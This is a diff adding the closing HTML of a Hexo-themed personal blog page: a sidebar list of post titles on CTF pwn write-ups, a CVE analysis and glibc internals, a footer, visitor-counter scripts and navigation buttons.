+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2021/11/23/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912021pwn-wp/" title="下一篇: 西湖论剑2021pwn-wp">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/12/07/UNCTF2021pwn-wp/">UNCTF2021pwn-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/11/23/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912021pwn-wp/">西湖论剑2021pwn-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/11/08/CVE-2021-30145-mpv/">CVE-2021-30145分析与复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/10/23/glibc-free%E5%8E%9F%E7%90%86%E5%8F%8A%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">glibc(2.26) free原理及源码分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/10/17/glibc-malloc%E5%8E%9F%E7%90%86%E5%8F%8A%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">glibc(2.26) malloc原理及源码分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/10/hello-world/">Hello World</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2021 Cyyyber
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
